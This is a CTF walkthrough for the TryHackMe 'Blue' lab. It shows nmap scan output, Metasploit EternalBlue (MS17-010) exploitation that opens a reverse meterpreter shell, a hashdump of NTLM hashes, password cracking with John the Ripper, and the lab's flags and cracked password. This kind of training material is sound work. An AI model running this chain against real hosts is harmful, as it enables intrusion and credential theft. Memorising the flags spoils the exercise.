```jsx
Machine:  Blue
Platform:  TryHackMe
Difficulty:  Easy
```

# Walkthrough:

You can find the machine [here](https://tryhackme.com/r/room/blue).

## Recon:

Lets start the things by a simple Nmap vulnerability scan. By `vuln` to run the command.
```bash
sudo nmap -sS -sC -sV -vv --script vuln IP
```

```console
┌──(husnain㉿husnain)-[~]
└─$ sudo nmap -sV -sC -vv --script vuln 10.10.194.57
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 16:52 PKT
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:52
Completed NSE at 16:52, 10.04s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:52
Completed NSE at 16:52, 0.00s elapsed
Initiating Ping Scan at 16:52
Scanning 10.10.194.57 [4 ports]
Completed Ping Scan at 16:52, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:52
Completed Parallel DNS resolution of 1 host. at 16:52, 0.02s elapsed
Initiating SYN Stealth Scan at 16:52
Scanning 10.10.194.57 [1000 ports]
Discovered open port 135/tcp on 10.10.194.57
Discovered open port 3389/tcp on 10.10.194.57
Discovered open port 445/tcp on 10.10.194.57
Discovered open port 139/tcp on 10.10.194.57
Discovered open port 49153/tcp on 10.10.194.57
Discovered open port 49158/tcp on 10.10.194.57
Discovered open port 49159/tcp on 10.10.194.57
Discovered open port 49152/tcp on 10.10.194.57
Discovered open port 49154/tcp on 10.10.194.57
Completed SYN Stealth Scan at 16:53, 44.62s elapsed (1000 total ports)
Initiating Service scan at 16:53
Scanning 9 services on 10.10.194.57
Service scan Timing: About 44.44% done; ETC: 16:55 (0:01:15 remaining)
Completed Service scan at 16:55, 133.63s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.194.57.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:55
NSE Timing: About 99.91% done; ETC: 16:56 (0:00:00 remaining)
NSE Timing: About 99.91% done; ETC: 16:56 (0:00:00 remaining)
NSE Timing: About 99.91% done; ETC: 16:57 (0:00:00 remaining)
Completed NSE at 16:57, 93.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:57
NSE: [ssl-ccs-injection 10.10.194.57:3389] No response from server: ERROR
Completed NSE at 16:57, 24.06s elapsed
Nmap scan report for 10.10.194.57
Host is up, received reset ttl 125 (0.31s latency).
Scanned at 2024-07-05 16:52:37 PKT for 296s
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:57
Completed NSE at 16:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:57
Completed NSE at 16:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 307.04 seconds
           Raw packets sent: 1120 (49.256KB) | Rcvd: 1067 (42.724KB)

```


From the scan result it is evident that the machine is vulnerabile to `ms17-010`.

```console

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
```

## Expoitation:
We'll use `msfconsole` for exploitation.

```console                                                                                                          
┌──(husnain㉿husnain)-[~]
└─$ msfconsole                                      
Metasploit tip: Network adapter names can be used for IP options set LHOST 
eth0
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.3.42-dev                          ]
+ -- --=[ 2375 exploits - 1229 auxiliary - 416 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

Load the respective module.
```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                             sics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.10.5       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Set the `LHOST` and `RHOST` attributes to the host and target machine IP Addresses respectively as shown below.
```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.17.93.24
LHOST => 10.17.93.24
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.194.57
RHOSTS => 10.10.194.57
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.194.57     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                             sics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.17.93.24      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Now use the command `run` or `exploit` to execute the exploit.
```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.17.93.24:4444 
[*] 10.10.194.57:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.194.57:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.194.57:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.194.57:445 - The target is vulnerable.
[*] 10.10.194.57:445 - Connecting to target for exploitation.
[+] 10.10.194.57:445 - Connection established for exploitation.
[+] 10.10.194.57:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.194.57:445 - Sending last fragment of exploit packet!
[*] 10.10.194.57:445 - Receiving response from exploit packet
[+] 10.10.194.57:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.194.57:445 - Sending egg to corrupted connection.
[*] 10.10.194.57:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.194.57
[*] Meterpreter session 1 opened (10.17.93.24:4444 -> 10.10.194.57:49171) at 2024-07-05 17:40:43 +0500
[+] 10.10.194.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.194.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.194.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

## Flags:
Firstly verify the initial foothold.
```console
meterpreter > shell
Process 1648 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Use the `hashdump` command to look for password hashes.
```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter >
```
Use `John the Ripper` or `Hash Cat` to crack the hash of `John`. You can use the following set of commands as well.
```console
──(husnain㉿husnain)-[~]
└─$ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)     
1g 0:00:00:00 DONE (2024-07-05 18:00) 1.470g/s 15000Kp/s 15000Kc/s 15000KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```
Password: `alqfna22`.

### Flag1
You'll find first flag in `system32`
```console
C:\Windows\system32>type C:\flag1.txt                                                                                       
type C:\flag1.txt                                                                                                           
flag{access_the_machine}                                                                                                    
C:\Windows\system32>                                                                                                        
 ```
Flag1: `flag{access_the_machine}`

### Flag2
Second flag will be in `C:/Windows/System32/config`
```console
C:\Windows\system32>cd config                                                                                               
cd config                                                                                                                   
                                                                                                                            
C:\Windows\System32\config>type flag2.txt                                                                                   
type flag2.txt                                                                                                              
flag{sam_database_elevated_access}                                                                                          
C:\Windows\System32\config>
```
Flag2: `flag{sam_database_elevated_access}`


### Flag3
 You can found the third flag in the `C:\Users` directory. From there you can enter  into `Jon` and then `Documents`. In the `Documents`, there will be a `flag3.txt` file.
```console
C:\Users>cd Jon
cd Jon

C:\Users\Jon>cd Documents
cd Documents

C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
C:\Users\Jon\Documents>
```
Flag3: `flag{admin_documents_can_be_valuable}`

---

***Try and Crack it*** **; )**

---
